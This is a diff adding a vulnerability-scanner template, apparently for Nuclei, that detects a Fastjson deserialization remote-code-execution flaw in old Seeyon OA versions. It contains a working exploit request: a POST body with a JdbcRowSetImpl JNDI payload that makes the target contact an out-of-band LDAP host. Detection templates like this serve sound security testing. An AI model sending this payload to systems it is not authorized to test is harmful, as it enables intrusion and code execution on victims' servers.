@@ -1,0 +1,32 @@
+id: seeyon-oa-fastjson-rce
+info:
+  name: Seeyon OA Fastjson RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The old version of Seeyon OA software (below V8.0, V8.0 was released on June 11, 2020) integrated Fastjson component has a deserialization vulnerability.
+    Exploitation of this vulnerability may lead to remote code execution.
+  tags: rce
+  reference:
+    - https://www.secrss.com/articles/30425
+
+http:
+  - raw:
+      - |
+        POST /seeyon/m3/loginController.do?method=transLogout HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        statisticId={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}", "autoCommit":true}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "ldap://.*"
